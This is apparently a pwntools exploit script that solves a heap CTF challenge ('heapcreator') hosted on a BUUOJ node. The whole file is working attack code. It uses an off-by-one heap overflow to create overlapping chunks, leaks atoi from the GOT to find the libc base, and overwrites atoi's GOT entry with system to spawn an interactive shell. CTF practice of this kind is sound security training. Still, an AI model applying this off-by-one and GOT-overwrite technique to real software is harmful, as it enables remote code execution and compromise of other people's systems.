from pwn import *

context.log_level = "info"
elf = ELF("./heapcreator")
libc = ELF("./libc6_2.23-0ubuntu11_amd64.so")

#sock = process(elf.path)
sock = remote("node4.buuoj.cn",29971)
gs = """
    break *0x400866
    continue
"""
#sock = gdb.debug(elf.path, gdbscript = gs)

def create(size, content):
    sock.sendafter(b"Your choice :", b"1")
    sock.sendafter(b"Size of Heap : ", str(size).encode())
    sock.sendafter(b"Content of heap:", content)
    log.info("create")

def edit(idx, content):
    sock.sendafter(b"Your choice :", b"2")
    sock.sendafter(b"Index :", str(idx).encode())
    sock.sendafter(b"Content of heap : ", content)
    log.info("edit")

def show(idx):
    sock.sendafter(b"Your choice :", b"3")
    sock.sendafter(b"Index :", str(idx).encode() )
    sock.recvuntil(b"Content : ")
    data = sock.recvline()
    log.info("show")
    return data

def delete(idx):
    sock.sendafter(b"Your choice :", b"4")
    sock.sendafter(b"Index :", str(idx).encode())
    log.info("delete")

create(0x18,b"AAAA")
create(0x10,b"BBBB")
edit(0, b'A' * 0x18 + b"\x41")
delete(1)
create(0x30, p64(0) * 4 + p64(0x30) + p64(elf.got["atoi"]))
data = show(1)
addr_atoi = u64(data[:-1].ljust(8,b"\x00"))
log.success("addr_atoi = " + hex(addr_atoi))
addr_libc_base = addr_atoi - libc.sym["atoi"]
log.success("addr_libc_base = " + hex(addr_libc_base))

addr_system = addr_libc_base + libc.sym["system"]
log.success("addr_system = " + hex(addr_system))

edit(1, p64(addr_system))
sock.sendafter(b"Your choice :", b"sh\x00")


sock.interactive()
